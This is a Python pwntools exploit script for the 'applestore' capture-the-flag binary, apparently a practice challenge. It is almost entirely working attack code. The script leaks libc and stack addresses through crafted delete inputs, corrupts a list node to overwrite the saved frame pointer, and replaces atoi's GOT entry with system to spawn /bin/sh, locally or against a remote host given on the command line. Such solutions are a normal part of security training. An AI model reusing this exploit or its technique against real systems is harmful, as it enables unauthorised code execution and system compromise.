from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
b main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './applestore_patched'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
libc = ELF('./libc_32.so.6', checksec=False)
rop = ROP(elf)
def add(item):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Number> ', item.encode())

def delete(item):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Number> ', item)

def list():
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'(y/n) > ', b'y')
def checkout():
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'(y/n) > ', b'y')
p = start()
for i in range(20):
    add('2')
for i in range(6):
    add('1')

checkout()
payload = b'27'+p32(elf.got['atoi'])+p32(0)*3
delete(payload)
p.recvuntil(b'27:')
libc.address = u32(p.recv(4))-libc.sym['atoi']
log.info('libc base: '+hex(libc.address))

payload = b'27' + p32(libc.sym['environ']) + p32(0)*3
delete(payload)
p.recvuntil(b'27:')
stack = u32(p.recv(4))
log.info('stack: '+hex(stack))
ebp_addr = stack - 0x104
log.info('ebp_addr: '+hex(ebp_addr))
payload = b'27' + p32(0)*2 +p32(elf.got['atoi']+0x22) + p32(ebp_addr-0x8)
delete(payload)
payload = p32(libc.sym['system']) + b';/bin/sh\x00'
p.sendlineafter(b'> ', payload)

p.interactive()

